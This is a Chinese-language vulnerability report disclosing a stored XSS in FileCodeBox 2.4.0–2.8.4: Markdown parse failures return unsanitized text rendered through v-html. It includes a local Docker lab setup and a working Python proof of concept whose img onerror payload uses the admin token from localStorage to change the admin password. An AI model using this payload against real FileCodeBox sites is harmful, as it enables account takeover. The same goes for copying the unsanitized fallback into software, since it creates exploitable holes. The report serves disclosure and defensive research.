# FileCodeBox 漏洞报告

软件名称：FileCodeBox

开发者或厂商：vastsa

代码仓库：https://github.com/vastsa/FileCodeBox

## 1. 文本分享 Markdown 预览在解析异常时输出未净化内容导致存储型 XSS

简要描述：攻击者分享一条恶意文本，用户打开该分享链接即被 XSS。

影响版本：2.4.0 ~ 2.8.4

前置条件：站点允许游客上传，且受害者打开攻击者提供的分享链接。

### 漏洞成因

文本分享的 Markdown 预览由 2024 主题在前端渲染。渲染函数 `renderMarkdownPreview` 先用 `marked` 把正文解析为 HTML，再交给 DOMPurify 净化。解析阶段抛出异常时，该函数直接把原始正文返回给调用方，相关代码如下：

```ts
// src/utils/content-preview.ts
export async function renderMarkdownPreview(content: string): Promise<string> {
  try {
    const { marked, DOMPurify } = await loadMarkdownRenderer()
    const rawHtml = await marked(content)
    return DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: MARKDOWN_ALLOWED_TAGS,
      ALLOWED_ATTR: MARKDOWN_ALLOWED_ATTR,
      ALLOWED_URI_REGEXP:
        /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp|xxx):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i
    })
  } catch (error) {
    console.error('Markdown 渲染失败:', error)
    return content
  }
}
```

`marked` 在处理深层嵌套引用时会抛出 `RangeError: Maximum call stack size exceeded`。因此，只要正文里连续出现足够多的 `>`，解析就会失败，`catch` 分支返回的正文没有经过任何净化。

这份正文随后被写入预览组件，组件通过 `v-html` 把它作为 HTML 插入页面：

```vue
<!-- src/components/common/ContentPreviewModal.vue:49 -->
<div
  class="prose max-w-none p-6 rounded-xl break-words overflow-wrap-anywhere"
  :class="isDarkMode ? 'prose-invert bg-zinc-900/60' : 'bg-slate-50'"
  v-html="renderedContent"
></div>
```

取件流程在文本分享取件成功后会自动打开预览，攻击者不需要受害者额外点击任何按钮：

```ts
// src/composables/useRetrieveFlow.ts
if (newFileData.content) {
  showPreview.value = true
}
```

脚本因此以站点自身的源执行，可以读取 `localStorage` 中的 token，从而接管账号。

### 复现环境搭建

```bash
mkdir filecodebox && cd filecodebox
cat > docker-compose.yml <<'EOF'
services:
  file-code-box:
    image: lanol/filecodebox:2.8.4
    container_name: filecodebox
    restart: "no"
    ports:
      - "12345:12345"
    environment:
      - APP_ENV=production
      - LOG_LEVEL=info
      - ACCESS_LOG=true
      - WORKERS=1
    volumes:
      - ./data:/app/data
EOF
docker compose up -d
```

访问 `http://127.0.0.1:12345` 完成初始化，保留初始化向导默认勾选的“允许游客上传”。

### 复现过程

接下来演示攻击者如何通过 XSS 修改管理员密码。

匿名创建一个文本分享，正文由 5000 个 `>` 和一段 `img` 标签组成。`img` 的 `onerror` 会借用当前页面的管理员 token 调用 `/admin/config/update`，把管理员口令改写为 `Pwned123456.`，同时在页面顶部插入一条红色横幅，便于确认脚本已执行。创建分享的脚本如下：

```python
import argparse

import httpx

ap = argparse.ArgumentParser()
ap.add_argument("--base", default="http://127.0.0.1:12345")
ap.add_argument("--new-password", default="Pwned123456.")
a = ap.parse_args()

js = (
    "document.title='PWNED';"
    "var b=document.createElement('div');"
    "b.textContent='Admin password has been changed';"
    "b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;"
    "background:#b91c1c;color:#fff;padding:10px;font:700 16px sans-serif';"
    "document.body.appendChild(b);"
    "fetch('/admin/config/update',{method:'PATCH',"
    "headers:{'content-type':'application/json',"
    "authorization:'Bearer '+localStorage.getItem('token')},"
    "body:JSON.stringify({admin_token:'%s'})})" % a.new_password
)
text = ">" * 5000 + '\n\n<img src=x onerror="' + js + '">\n'

r = httpx.post(
    a.base + "/share/text/",
    data={"text": text, "expire_value": "1", "expire_style": "day"},
    timeout=30,
)
r.raise_for_status()
code = r.json()["detail"]["code"]
print("code:", code)
print("url :", "%s/#/?code=%s" % (a.base, code))
```

脚本输出取件码 `VJAKY` 与链接 `http://127.0.0.1:12345/#/?code=VJAKY`。

管理员打开该链接，被 XSS：

![](img/02-xss-triggered.png)

此时管理员口令已经被改写。攻击者用新口令登录后台：

![](img/03-pwned-login.png)
